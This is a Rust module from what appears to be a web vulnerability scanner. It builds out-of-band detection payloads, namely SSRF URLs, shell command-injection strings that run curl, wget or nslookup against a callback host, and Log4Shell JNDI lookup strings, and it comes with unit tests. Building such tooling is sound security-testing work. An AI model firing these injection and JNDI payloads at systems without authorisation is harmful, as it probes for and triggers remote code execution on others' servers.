//! Payload builders. Given an [`OobToken`], produce the attack strings
//! that different vulnerability classes expect.
//!
//! Keeping this out of the server crate means both the active scanner
//! and Intruder can reach for the same catalogue.

use crate::server::OobToken;

/// Which vulnerability class we are building payloads for. The scanner
/// uses this to control the shape of the generated strings.
#[derive(Debug, Clone, Copy)]
pub enum PayloadFamily {
    /// Full URL that the target should request (SSRF, open redirect,
    /// webhook validation bypass, Log4Shell with jndi:ldap, …).
    Ssrf,
    /// Shell/command injection payloads: should cause the target to
    /// shell out to `curl`/`wget`/`nslookup` against our URL/host.
    CommandInjection,
    /// Pure DNS lookup payload (hostname only, no scheme). Used for
    /// blind SQLi via `xp_dirtree`, blind SSRF through libraries that
    /// resolve a host without fetching, Log4Shell's `${jndi:dns:...}`
    /// etc.
    DnsLookup,
    /// Log4Shell-style JNDI lookup string.
    Log4Shell,
}

/// Produce a short list of payloads for a given family.
///
/// The scanner iterates every string against the current insertion
/// point. Each string is designed to trigger a callback for the given
/// token (`token.correlation_id`).
pub fn build_payloads_for(family: PayloadFamily, token: &OobToken) -> Vec<String> {
    let url = &token.http_url;
    let host = &token.dns_name;
    // For IP-based public hosts (common in local testing), the
    // subdomain form `abc.127.0.0.1` is not DNS-resolvable. Emit a
    // path-form URL that encodes the correlation id in the path so the
    // server still correlates the hit.
    let (host_only, port_part) = split_host_port(&token.public_host);
    let path_url = if host_only.parse::<std::net::IpAddr>().is_ok() {
        Some(format!(
            "http://{}{}/{}",
            host_only, port_part, token.correlation_id
        ))
    } else {
        None
    };
    match family {
        PayloadFamily::Ssrf => {
            let mut out = vec![
                url.clone(),
                format!("//{host}/"),
                format!("http://{host}"),
                format!("//{host}"),
            ];
            if let Some(p) = path_url {
                out.insert(0, p);
            }
            out
        }
        PayloadFamily::CommandInjection => {
            // Try each common shell operator with curl + nslookup. If
            // the public host is an IP, path-encode the correlation id
            // so a plain `curl` call still hits the right endpoint.
            let base_url = path_url.clone().unwrap_or_else(|| url.clone());
            vec![
                format!("; curl {base_url}"),
                format!("| curl {base_url}"),
                format!("`curl {base_url}`"),
                format!("$(curl {base_url})"),
                format!("&& curl {base_url}"),
                format!(";wget {base_url}"),
                format!(";nslookup {host}"),
                format!("& nslookup {host}"),
            ]
        }
        PayloadFamily::DnsLookup => vec![host.clone(), format!(".{host}")],
        PayloadFamily::Log4Shell => vec![
            format!("${{jndi:ldap://{host}/a}}"),
            format!("${{jndi:dns://{host}/a}}"),
            format!("${{jndi:ldap://{host}:1389/exploit}}"),
        ],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn mk_token() -> OobToken {
        OobToken {
            correlation_id: "abc".into(),
            public_host: "oob.local:7898".into(),
            http_url: "http://abc.oob.local:7898/".into(),
            dns_name: "abc.oob.local:7898".into(),
        }
    }

    #[test]
    fn ssrf_payloads_use_url() {
        let p = build_payloads_for(PayloadFamily::Ssrf, &mk_token());
        assert!(p.iter().any(|s| s.contains("http://abc.oob.local")));
    }

    #[test]
    fn command_injection_includes_curl_and_nslookup() {
        let p = build_payloads_for(PayloadFamily::CommandInjection, &mk_token());
        assert!(p.iter().any(|s| s.contains("curl")));
        assert!(p.iter().any(|s| s.contains("nslookup")));
    }

    #[test]
    fn log4shell_variants() {
        let p = build_payloads_for(PayloadFamily::Log4Shell, &mk_token());
        assert!(p.iter().any(|s| s.contains("jndi:ldap")));
        assert!(p.iter().any(|s| s.contains("jndi:dns")));
    }
}


fn split_host_port(public_host: &str) -> (&str, String) {
    if let Some((h, p)) = public_host.rsplit_once(':') {
        if p.parse::<u16>().is_ok() {
            return (h, format!(":{p}"));
        }
    }
    (public_host, String::new())
}
